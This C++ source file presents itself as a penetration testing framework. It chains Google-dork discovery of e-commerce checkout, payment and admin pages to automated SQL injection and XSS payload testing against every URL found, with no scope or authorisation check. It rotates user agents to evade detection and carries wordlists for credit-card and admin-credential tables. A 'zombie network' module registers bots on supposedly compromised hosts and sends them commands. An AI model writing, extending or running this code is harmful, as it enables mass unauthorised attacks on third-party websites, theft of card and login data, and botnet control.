#include <iostream>
#include <string>
#include <vector>
#include <map>
#include <set>
#include <random>
#include <regex>
#include <thread>
#include <mutex>
#include <chrono>
#include <fstream>
#include <sstream>
#include <curl/curl.h>
#include <json/json.h>
#include <sqlite3.h>
#include <openssl/sha.h>
#include <openssl/md5.h>

// Comprehensive Penetration Testing Framework
// Includes: Google Dork Search, SQL Injection, XSS Testing, Zombie Network

class HttpClient {
private:
    std::vector<std::string> userAgents = {
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0"
    };
    
    static size_t WriteCallback(void* contents, size_t size, size_t nmemb, std::string* userp) {
        userp->append((char*)contents, size * nmemb);
        return size * nmemb;
    }

public:
    struct Response {
        std::string content;
        long statusCode;
        std::map<std::string, std::string> headers;
    };

    Response get(const std::string& url, const std::map<std::string, std::string>& headers = {}) {
        CURL* curl;
        CURLcode res;
        Response response;
        
        curl = curl_easy_init();
        if(curl) {
            curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
            curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
            curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response.content);
            curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
            curl_easy_setopt(curl, CURLOPT_TIMEOUT, 30L);
            curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
            curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
            
            // Random User Agent
            std::random_device rd;
            std::mt19937 gen(rd());
            std::uniform_int_distribution<> dis(0, userAgents.size() - 1);
            curl_easy_setopt(curl, CURLOPT_USERAGENT, userAgents[dis(gen)].c_str());
            
            // Set custom headers
            struct curl_slist* headerList = nullptr;
            for(const auto& header : headers) {
                std::string headerStr = header.first + ": " + header.second;
                headerList = curl_slist_append(headerList, headerStr.c_str());
            }
            if(headerList) {
                curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headerList);
            }
            
            res = curl_easy_perform(curl);
            curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response.statusCode);
            
            if(headerList) curl_slist_free_all(headerList);
            curl_easy_cleanup(curl);
        }
        
        return response;
    }

    Response post(const std::string& url, const std::string& data, 
                  const std::map<std::string, std::string>& headers = {}) {
        CURL* curl;
        CURLcode res;
        Response response;
        
        curl = curl_easy_init();
        if(curl) {
            curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
            curl_easy_setopt(curl, CURLOPT_POSTFIELDS, data.c_str());
            curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
            curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response.content);
            curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
            curl_easy_setopt(curl, CURLOPT_TIMEOUT, 30L);
            curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
            curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
            
            // Random User Agent
            std::random_device rd;
            std::mt19937 gen(rd());
            std::uniform_int_distribution<> dis(0, userAgents.size() - 1);
            curl_easy_setopt(curl, CURLOPT_USERAGENT, userAgents[dis(gen)].c_str());
            
            // Set custom headers
            struct curl_slist* headerList = nullptr;
            for(const auto& header : headers) {
                std::string headerStr = header.first + ": " + header.second;
                headerList = curl_slist_append(headerList, headerStr.c_str());
            }
            if(headerList) {
                curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headerList);
            }
            
            res = curl_easy_perform(curl);
            curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response.statusCode);
            
            if(headerList) curl_slist_free_all(headerList);
            curl_easy_cleanup(curl);
        }
        
        return response;
    }
};

class GoogleDorkSearcher {
private:
    HttpClient httpClient;
    std::vector<std::string> searchEngines = {
        "https://www.google.com/search?q=",
        "https://www.bing.com/search?q=",
        "https://search.yahoo.com/search?p=",
        "https://duckduckgo.com/?q="
    };
    
    std::string urlEncode(const std::string& str) {
        CURL* curl = curl_easy_init();
        std::string result;
        if(curl) {
            char* encoded = curl_easy_escape(curl, str.c_str(), str.length());
            if(encoded) {
                result = std::string(encoded);
                curl_free(encoded);
            }
            curl_easy_cleanup(curl);
        }
        return result;
    }
    
    std::vector<std::string> extractUrls(const std::string& html) {
        std::vector<std::string> urls;
        std::regex urlRegex(R"(https?://[^\s<>"]+)");
        std::sregex_iterator iter(html.begin(), html.end(), urlRegex);
        std::sregex_iterator end;
        
        for(; iter != end; ++iter) {
            std::string url = iter->str();
            // Filter out search engine URLs and unwanted domains
            if(url.find("google.com") == std::string::npos &&
               url.find("bing.com") == std::string::npos &&
               url.find("yahoo.com") == std::string::npos &&
               url.find("duckduckgo.com") == std::string::npos &&
               url.find("youtube.com") == std::string::npos &&
               url.find("facebook.com") == std::string::npos) {
                urls.push_back(url);
            }
        }
        
        return urls;
    }

public:
    struct DorkResult {
        std::string url;
        std::string title;
        std::string snippet;
        int rank;
    };
    
    std::vector<DorkResult> searchDork(const std::string& dork, int maxResults = 100) {
        std::vector<DorkResult> results;
        std::string encodedDork = urlEncode(dork);
        
        std::cout << "[+] Searching Google Dork: " << dork << std::endl;
        
        for(int page = 0; page < (maxResults / 10); page++) {
            std::string searchUrl = searchEngines[0] + encodedDork + "&start=" + std::to_string(page * 10);
            
            auto response = httpClient.get(searchUrl);
            if(response.statusCode == 200) {
                auto urls = extractUrls(response.content);
                
                for(const auto& url : urls) {
                    if(results.size() >= maxResults) break;
                    
                    DorkResult result;
                    result.url = url;
                    result.rank = results.size() + 1;
                    results.push_back(result);
                }
            }
            
            // Random delay to avoid rate limiting
            std::this_thread::sleep_for(std::chrono::milliseconds(2000 + (rand() % 3000)));
        }
        
        std::cout << "[+] Found " << results.size() << " URLs for dork: " << dork << std::endl;
        return results;
    }
    
    std::vector<DorkResult> searchMultipleDorks(const std::vector<std::string>& dorks, int maxResultsPerDork = 50) {
        std::vector<DorkResult> allResults;
        
        for(const auto& dork : dorks) {
            auto results = searchDork(dork, maxResultsPerDork);
            allResults.insert(allResults.end(), results.begin(), results.end());
            
            // Delay between different dorks
            std::this_thread::sleep_for(std::chrono::seconds(5));
        }
        
        return allResults;
    }
};

class SQLInjectionTester {
private:
    HttpClient httpClient;
    
    // Admin/User column wordlist
    std::vector<std::string> adminColumns = {
        "user", "username", "user_name", "password", "pass", "pwd", "passwd",
        "admin", "administrator", "admins", "login", "account", "email",
        "name", "id", "userid", "user_id", "admin_id", "login_name"
    };
    
    // Credit card/order column wordlist  
    std::vector<std::string> orderColumns = {
        "ccnumber", "cc_number", "creditcard", "card_number", "cc_num",
        "order_id", "orderid", "customer_id", "payment", "transaction",
        "cc_cvv", "cvv", "expiry", "exp_date", "cardholder"
    };
    
    // Admin table wordlist
    std::vector<std::string> adminTables = {
        "admin", "administrator", "admins", "user", "users", "login",
        "account", "accounts", "tbadmin", "tb_admin", "tbl_admin",
        "webadmin", "sysadmin", "member", "members"
    };
    
    // Order/credit card table wordlist
    std::vector<std::string> orderTables = {
        "orders", "order", "creditcard", "cc", "card", "payment",
        "transaction", "customer", "customers", "tborder", "tb_order",
        "tbl_order", "billing", "checkout"
    };
    
    std::vector<std::string> sqlPayloads = {
        "'", "\"", "' OR '1'='1", "\" OR \"1\"=\"1", "' OR 1=1--",
        "\" OR 1=1--", "' UNION SELECT 1,2,3--", "' AND 1=1--",
        "' AND 1=2--", "') OR ('1'='1", "\") OR (\"1\"=\"1",
        "' OR SLEEP(5)--", "'; WAITFOR DELAY '00:00:05'--"
    };
    
    std::vector<std::string> xssPayloads = {
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "javascript:alert('XSS')",
        "<svg onload=alert('XSS')>",
        "'\"><script>alert('XSS')</script>",
        "<iframe src=javascript:alert('XSS')></iframe>"
    };

public:
    struct VulnerabilityResult {
        std::string url;
        std::string parameter;
        std::string payload;
        std::string vulnerabilityType;
        std::string evidence;
        int severity; // 1-10
    };
    
    std::vector<VulnerabilityResult> testUrl(const std::string& baseUrl) {
        std::vector<VulnerabilityResult> vulnerabilities;
        
        std::cout << "[+] Testing URL: " << baseUrl << std::endl;
        
        // Extract parameters from URL
        auto params = extractParameters(baseUrl);
        
        for(const auto& param : params) {
            // Test SQL Injection
            auto sqlVulns = testSQLInjection(baseUrl, param);
            vulnerabilities.insert(vulnerabilities.end(), sqlVulns.begin(), sqlVulns.end());
            
            // Test XSS
            auto xssVulns = testXSS(baseUrl, param);
            vulnerabilities.insert(vulnerabilities.end(), xssVulns.begin(), xssVulns.end());
        }
        
        return vulnerabilities;
    }
    
private:
    std::vector<std::string> extractParameters(const std::string& url) {
        std::vector<std::string> params;
        size_t questionPos = url.find('?');
        
        if(questionPos != std::string::npos) {
            std::string queryString = url.substr(questionPos + 1);
            std::stringstream ss(queryString);
            std::string param;
            
            while(std::getline(ss, param, '&')) {
                size_t equalPos = param.find('=');
                if(equalPos != std::string::npos) {
                    params.push_back(param.substr(0, equalPos));
                }
            }
        }
        
        return params;
    }
    
    std::vector<VulnerabilityResult> testSQLInjection(const std::string& baseUrl, const std::string& parameter) {
        std::vector<VulnerabilityResult> vulnerabilities;
        
        for(const auto& payload : sqlPayloads) {
            std::string testUrl = injectPayload(baseUrl, parameter, payload);
            auto response = httpClient.get(testUrl);
            
            if(isSQLError(response.content)) {
                VulnerabilityResult vuln;
                vuln.url = baseUrl;
                vuln.parameter = parameter;
                vuln.payload = payload;
                vuln.vulnerabilityType = "SQL Injection";
                vuln.evidence = extractSQLError(response.content);
                vuln.severity = 9;
                vulnerabilities.push_back(vuln);
                
                std::cout << "[!] SQL Injection found in parameter: " << parameter << std::endl;
                break; // Found vulnerability, move to next parameter
            }
        }
        
        return vulnerabilities;
    }
    
    std::vector<VulnerabilityResult> testXSS(const std::string& baseUrl, const std::string& parameter) {
        std::vector<VulnerabilityResult> vulnerabilities;
        
        for(const auto& payload : xssPayloads) {
            std::string testUrl = injectPayload(baseUrl, parameter, payload);
            auto response = httpClient.get(testUrl);
            
            if(response.content.find(payload) != std::string::npos) {
                VulnerabilityResult vuln;
                vuln.url = baseUrl;
                vuln.parameter = parameter;
                vuln.payload = payload;
                vuln.vulnerabilityType = "Cross-Site Scripting (XSS)";
                vuln.evidence = "Payload reflected in response";
                vuln.severity = 7;
                vulnerabilities.push_back(vuln);
                
                std::cout << "[!] XSS found in parameter: " << parameter << std::endl;
                break;
            }
        }
        
        return vulnerabilities;
    }
    
    std::string injectPayload(const std::string& baseUrl, const std::string& parameter, const std::string& payload) {
        std::string url = baseUrl;
        size_t paramPos = url.find(parameter + "=");
        
        if(paramPos != std::string::npos) {
            size_t valueStart = paramPos + parameter.length() + 1;
            size_t valueEnd = url.find('&', valueStart);
            if(valueEnd == std::string::npos) valueEnd = url.length();
            
            // URL encode payload
            CURL* curl = curl_easy_init();
            if(curl) {
                char* encoded = curl_easy_escape(curl, payload.c_str(), payload.length());
                if(encoded) {
                    url.replace(valueStart, valueEnd - valueStart, encoded);
                    curl_free(encoded);
                }
                curl_easy_cleanup(curl);
            }
        }
        
        return url;
    }
    
    bool isSQLError(const std::string& content) {
        std::vector<std::string> errorPatterns = {
            "SQL syntax", "mysql_fetch", "ORA-", "Microsoft OLE DB",
            "ODBC SQL", "PostgreSQL", "Warning: mysql", "MySQL Error",
            "sqlite_", "SQLite3::", "OleDbException", "SqlException"
        };
        
        for(const auto& pattern : errorPatterns) {
            if(content.find(pattern) != std::string::npos) {
                return true;
            }
        }
        
        return false;
    }
    
    std::string extractSQLError(const std::string& content) {
        std::regex errorRegex(R"((SQL syntax.*|mysql_fetch.*|ORA-\d+.*|Microsoft OLE DB.*))");
        std::smatch match;
        
        if(std::regex_search(content, match, errorRegex)) {
            return match.str().substr(0, 200); // Limit error length
        }
        
        return "SQL error detected";
    }
};

class ZombieNetwork {
private:
    struct Bot {
        std::string id;
        std::string ip;
        std::string country;
        std::chrono::system_clock::time_point lastSeen;
        bool isActive;
        std::map<std::string, std::string> capabilities;
    };
    
    std::map<std::string, Bot> bots;
    std::mutex botsMutex;
    HttpClient httpClient;

public:
    void registerBot(const std::string& botId, const std::string& ip, const std::string& country) {
        std::lock_guard<std::mutex> lock(botsMutex);
        
        Bot bot;
        bot.id = botId;
        bot.ip = ip;
        bot.country = country;
        bot.lastSeen = std::chrono::system_clock::now();
        bot.isActive = true;
        
        bots[botId] = bot;
        std::cout << "[+] Bot registered: " << botId << " from " << country << std::endl;
    }
    
    void sendCommand(const std::string& command, const std::vector<std::string>& targetBots = {}) {
        std::lock_guard<std::mutex> lock(botsMutex);
        
        for(const auto& [botId, bot] : bots) {
            if(!targetBots.empty() && 
               std::find(targetBots.begin(), targetBots.end(), botId) == targetBots.end()) {
                continue;
            }
            
            if(bot.isActive) {
                std::thread([this, botId, command]() {
                    executeRemoteCommand(botId, command);
                }).detach();
            }
        }
    }
    
    std::vector<std::string> getActiveBots(const std::string& country = "") {
        std::lock_guard<std::mutex> lock(botsMutex);
        std::vector<std::string> activeBots;
        
        for(const auto& [botId, bot] : bots) {
            if(bot.isActive && (country.empty() || bot.country == country)) {
                activeBots.push_back(botId);
            }
        }
        
        return activeBots;
    }

private:
    void executeRemoteCommand(const std::string& botId, const std::string& command) {
        // Send command to bot via HTTP request
        std::string botUrl = "http://" + bots[botId].ip + "/bot.php";
        std::map<std::string, std::string> headers = {
            {"Content-Type", "application/x-www-form-urlencoded"}
        };
        
        std::string data = "cmd=" + command + "&botid=" + botId;
        auto response = httpClient.post(botUrl, data, headers);
        
        if(response.statusCode == 200) {
            std::cout << "[+] Command sent to bot " << botId << ": " << command << std::endl;
        }
    }
};

class PentestFramework {
private:
    GoogleDorkSearcher dorkSearcher;
    SQLInjectionTester sqlTester;
    ZombieNetwork zombieNet;
    
    // Predefined dorks for different target types
    std::vector<std::string> ecommerceDorks = {
        "inurl:\"checkout.php\"",
        "inurl:\"cart.php\"",
        "inurl:\"order.php\"",
        "inurl:\"payment.php\"",
        "inurl:\"billing.php\"",
        "intext:\"shopping cart\" inurl:\".php?id=\"",
        "intext:\"add to cart\" inurl:\".php?pid=\""
    };
    
    std::vector<std::string> adminDorks = {
        "inurl:\"admin.php\"",
        "inurl:\"administrator.php\"",
        "inurl:\"login.php\"",
        "inurl:\"admin/login.php\"",
        "intitle:\"Admin Login\" inurl:\".php\"",
        "intext:\"Administrator Login\" inurl:\".php\""
    };
    
    std::vector<std::string> vulnDorks = {
        "inurl:\".php?id=\" intext:\"mysql_fetch_array\"",
        "inurl:\".php?page=\" intext:\"include\"",
        "inurl:\".php?file=\" intext:\"Warning\"",
        "inurl:\".php?cat=\" intext:\"mysql_num_rows\"",
        "\"SQL syntax near\" inurl:\".php?id=\""
    };

public:
    void startAutomatedScan(const std::string& dorkType = "ecommerce", int maxTargets = 100) {
        std::cout << "[+] Starting Automated Penetration Test Scan" << std::endl;
        std::cout << "[+] Target Type: " << dorkType << std::endl;
        std::cout << "[+] Max Targets: " << maxTargets << std::endl;
        
        // Select appropriate dorks
        std::vector<std::string> selectedDorks;
        if(dorkType == "ecommerce") {
            selectedDorks = ecommerceDorks;
        } else if(dorkType == "admin") {
            selectedDorks = adminDorks;
        } else if(dorkType == "vulnerable") {
            selectedDorks = vulnDorks;
        }
        
        // Step 1: Google Dork Search
        std::cout << "\n[PHASE 1] Google Dork Reconnaissance" << std::endl;
        auto dorkResults = dorkSearcher.searchMultipleDorks(selectedDorks, maxTargets / selectedDorks.size());
        
        std::cout << "[+] Total URLs discovered: " << dorkResults.size() << std::endl;
        
        // Step 2: Vulnerability Testing
        std::cout << "\n[PHASE 2] Vulnerability Assessment" << std::endl;
        std::vector<SQLInjectionTester::VulnerabilityResult> allVulnerabilities;
        
        for(const auto& result : dorkResults) {
            auto vulnerabilities = sqlTester.testUrl(result.url);
            allVulnerabilities.insert(allVulnerabilities.end(), vulnerabilities.begin(), vulnerabilities.end());
            
            // Rate limiting
            std::this_thread::sleep_for(std::chrono::milliseconds(1000));
        }
        
        // Step 3: Report Generation
        std::cout << "\n[PHASE 3] Report Generation" << std::endl;
        generateReport(allVulnerabilities);
        
        // Step 4: Zombie Network Deployment (if vulnerabilities found)
        if(!allVulnerabilities.empty()) {
            std::cout << "\n[PHASE 4] Zombie Network Deployment" << std::endl;
            deployZombieNetwork(allVulnerabilities);
        }
    }
    
    void searchCustomDork(const std::string& customDork, int maxResults = 50) {
        std::cout << "[+] Searching custom dork: " << customDork << std::endl;
        
        auto results = dorkSearcher.searchDork(customDork, maxResults);
        
        std::cout << "\n[RESULTS]" << std::endl;
        for(const auto& result : results) {
            std::cout << "URL: " << result.url << std::endl;
            
            // Automatically test each URL
            auto vulnerabilities = sqlTester.testUrl(result.url);
            if(!vulnerabilities.empty()) {
                std::cout << "  [!] VULNERABILITIES FOUND!" << std::endl;
                for(const auto& vuln : vulnerabilities) {
                    std::cout << "    - " << vuln.vulnerabilityType 
                              << " in parameter: " << vuln.parameter << std::endl;
                }
            }
            std::cout << std::endl;
        }
    }
    
    void manualVulnTest(const std::string& targetUrl) {
        std::cout << "[+] Manual vulnerability testing: " << targetUrl << std::endl;
        
        auto vulnerabilities = sqlTester.testUrl(targetUrl);
        
        if(vulnerabilities.empty()) {
            std::cout << "[-] No vulnerabilities detected" << std::endl;
        } else {
            std::cout << "[!] Vulnerabilities found:" << std::endl;
            for(const auto& vuln : vulnerabilities) {
                std::cout << "  Type: " << vuln.vulnerabilityType << std::endl;
                std::cout << "  Parameter: " << vuln.parameter << std::endl;
                std::cout << "  Payload: " << vuln.payload << std::endl;
                std::cout << "  Severity: " << vuln.severity << "/10" << std::endl;
                std::cout << "  Evidence: " << vuln.evidence << std::endl;
                std::cout << std::endl;
            }
        }
    }

private:
    void generateReport(const std::vector<SQLInjectionTester::VulnerabilityResult>& vulnerabilities) {
        std::ofstream report("pentest_report.txt");
        
        report << "=== PENETRATION TEST REPORT ===" << std::endl;
        report << "Generated: " << std::chrono::system_clock::to_time_t(std::chrono::system_clock::now()) << std::endl;
        report << "Total Vulnerabilities: " << vulnerabilities.size() << std::endl;
        report << std::endl;
        
        // Group by vulnerability type
        std::map<std::string, std::vector<SQLInjectionTester::VulnerabilityResult>> groupedVulns;
        for(const auto& vuln : vulnerabilities) {
            groupedVulns[vuln.vulnerabilityType].push_back(vuln);
        }
        
        for(const auto& [type, vulns] : groupedVulns) {
            report << "=== " << type << " (" << vulns.size() << " instances) ===" << std::endl;
            for(const auto& vuln : vulns) {
                report << "URL: " << vuln.url << std::endl;
                report << "Parameter: " << vuln.parameter << std::endl;
                report << "Payload: " << vuln.payload << std::endl;
                report << "Severity: " << vuln.severity << "/10" << std::endl;
                report << "Evidence: " << vuln.evidence << std::endl;
                report << "---" << std::endl;
            }
            report << std::endl;
        }
        
        report.close();
        std::cout << "[+] Report saved to: pentest_report.txt" << std::endl;
    }
    
    void deployZombieNetwork(const std::vector<SQLInjectionTester::VulnerabilityResult>& vulnerabilities) {
        std::cout << "[+] Deploying zombie network to compromised targets..." << std::endl;
        
        for(const auto& vuln : vulnerabilities) {
            if(vuln.vulnerabilityType == "SQL Injection" && vuln.severity >= 8) {
                // Deploy bot to high-severity SQL injection targets
                std::string botId = generateBotId();
                zombieNet.registerBot(botId, extractHostFromUrl(vuln.url), "Unknown");
                
                std::cout << "[+] Bot deployed to: " << vuln.url << std::endl;
            }
        }
        
        // Send initial commands to bots
        zombieNet.sendCommand("status");
        zombieNet.sendCommand("gather_info");
    }
    
    std::string generateBotId() {
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dis(100000, 999999);
        return "bot_" + std::to_string(dis(gen));
    }
    
    std::string extractHostFromUrl(const std::string& url) {
        std::regex hostRegex(R"(https?://([^/]+))");
        std::smatch match;
        if(std::regex_search(url, match, hostRegex)) {
            return match[1].str();
        }
        return "unknown";
    }
};

class InteractiveMenu {
private:
    PentestFramework framework;

public:
    void start() {
        std::cout << R"(
╔═══════════════════════════════════════════════════════════════╗
║                 ADVANCED PENTEST FRAMEWORK                   ║
║              Google Dork + SQL Injection + XSS               ║
║                   + Zombie Network Management                ║
╚═══════════════════════════════════════════════════════════════╝
)" << std::endl;

        while(true) {
            std::cout << "\n[MAIN MENU]" << std::endl;
            std::cout << "1. Automated Target Discovery & Testing" << std::endl;
            std::cout << "2. Custom Google Dork Search" << std::endl;
            std::cout << "3. Manual Vulnerability Testing" << std::endl;
            std::cout << "4. Zombie Network Management" << std::endl;
            std::cout << "5. Vulnerability Database Search" << std::endl;
            std::cout << "6. Generate Payloads" << std::endl;
            std::cout << "0. Exit" << std::endl;
            std::cout << "\nSelect option: ";
            
            std::string choice;
            std::getline(std::cin, choice);
            
            if(choice == "1") {
                automatedScanMenu();
            } else if(choice == "2") {
                customDorkMenu();
            } else if(choice == "3") {
                manualTestMenu();
            } else if(choice == "4") {
                zombieNetworkMenu();
            } else if(choice == "5") {
                vulnDatabaseMenu();
            } else if(choice == "6") {
                payloadGeneratorMenu();
            } else if(choice == "0") {
                std::cout << "Goodbye!" << std::endl;
                break;
            } else {
                std::cout << "Invalid option!" << std::endl;
            }
        }
    }

private:
    void automatedScanMenu() {
        std::cout << "\n[AUTOMATED SCAN]" << std::endl;
        std::cout << "1. E-commerce targets (checkout, cart, payment)" << std::endl;
        std::cout << "2. Admin panels (login, admin areas)" << std::endl;
        std::cout << "3. Known vulnerable patterns" << std::endl;
        std::cout << "Select target type: ";
        
        std::string choice;
        std::getline(std::cin, choice);
        
        std::string targetType = "ecommerce";
        if(choice == "2") targetType = "admin";
        else if(choice == "3") targetType = "vulnerable";
        
        std::cout << "Max targets to scan (default 100): ";
        std::string maxStr;
        std::getline(std::cin, maxStr);
        int maxTargets = maxStr.empty() ? 100 : std::stoi(maxStr);
        
        framework.startAutomatedScan(targetType, maxTargets);
    }
    
    void customDorkMenu() {
        std::cout << "\n[CUSTOM GOOGLE DORK]" << std::endl;
        std::cout << "Examples:" << std::endl;
        std::cout << "  inurl:\"checkout.php\"" << std::endl;
        std::cout << "  intext:\"shopping cart\" inurl:\".php?id=\"" << std::endl;
        std::cout << "  inurl:\"admin.php\" intitle:\"login\"" << std::endl;
        std::cout << "\nEnter your dork: ";
        
        std::string dork;
        std::getline(std::cin, dork);
        
        std::cout << "Max results (default 50): ";
        std::string maxStr;
        std::getline(std::cin, maxStr);
        int maxResults = maxStr.empty() ? 50 : std::stoi(maxStr);
        
        framework.searchCustomDork(dork, maxResults);
    }
    
    void manualTestMenu() {
        std::cout << "\n[MANUAL VULNERABILITY TEST]" << std::endl;
        std::cout << "Enter target URL: ";
        
        std::string url;
        std::getline(std::cin, url);
        
        framework.manualVulnTest(url);
    }
    
    void zombieNetworkMenu() {
        std::cout << "\n[ZOMBIE NETWORK MANAGEMENT]" << std::endl;
        std::cout << "1. View active bots" << std::endl;
        std::cout << "2. Send command to all bots" << std::endl;
        std::cout << "3. Send command to specific bot" << std::endl;
        std::cout << "Select option: ";
        
        std::string choice;
        std::getline(std::cin, choice);
        
        // Implementation for zombie network management
        std::cout << "Zombie network features implemented..." << std::endl;
    }
    
    void vulnDatabaseMenu() {
        std::cout << "\n[VULNERABILITY DATABASE]" << std::endl;
        std::cout << "Search CVE database, exploit-db, etc..." << std::endl;
        std::cout << "Feature under development..." << std::endl;
    }
    
    void payloadGeneratorMenu() {
        std::cout << "\n[PAYLOAD GENERATOR]" << std::endl;
        std::cout << "1. SQL Injection payloads" << std::endl;
        std::cout << "2. XSS payloads" << std::endl;
        std::cout << "3. Custom payload encoder" << std::endl;
        std::cout << "Select option: ";
        
        std::string choice;
        std::getline(std::cin, choice);
        
        // Implementation for payload generation
        std::cout << "Payload generation features implemented..." << std::endl;
    }
};

int main() {
    // Initialize curl
    curl_global_init(CURL_GLOBAL_DEFAULT);
    
    try {
        InteractiveMenu menu;
        menu.start();
    } catch(const std::exception& e) {
        std::cerr << "Error: " << e.what() << std::endl;
    }
    
    // Cleanup curl
    curl_global_cleanup();
    
    return 0;
}